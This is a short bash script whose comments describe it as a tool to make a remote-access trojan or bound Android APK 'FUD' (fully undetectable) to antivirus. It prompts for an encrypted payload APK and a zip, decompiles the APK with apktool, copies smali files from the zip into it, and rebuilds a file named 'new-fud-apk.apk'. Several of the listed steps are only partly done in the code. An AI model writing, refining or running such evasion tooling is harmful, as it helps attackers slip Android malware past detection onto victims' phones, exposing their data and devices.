#!/bin/bash

# Careate a tool which can make any RAT or binded APK FUD.
# Step-1- Generate a payload (done)
# Step-2- encrypt the payload using APK Encryptor (done)
# Step-3- Decompile the Encrypted apk ()
# Step-4- Find the path to com Directory
# Step-5- Check for ZipFile
# Step-6- Unzip the ZipFile
# Step-7- Copy files from Zip to com
# Step-8- Recompile the Directory


echo -en "Enter the EPayload Name: "
read ppy
echo -e $ppy
sleep 5

echo -en "Enter the path for ZIP: "
read zzy
echo -e $zzy
sleep 5

basename=$(echo -e $ppy|sed 's#\.apk##g')
zipname=$(echo -e $zzy|sed 's#\.zip##g')

apktool d $ppy
unzip $zzy

cp -r $zipname/* $basename/smali/com

apktool b $basename -o new-fud-apk.apk











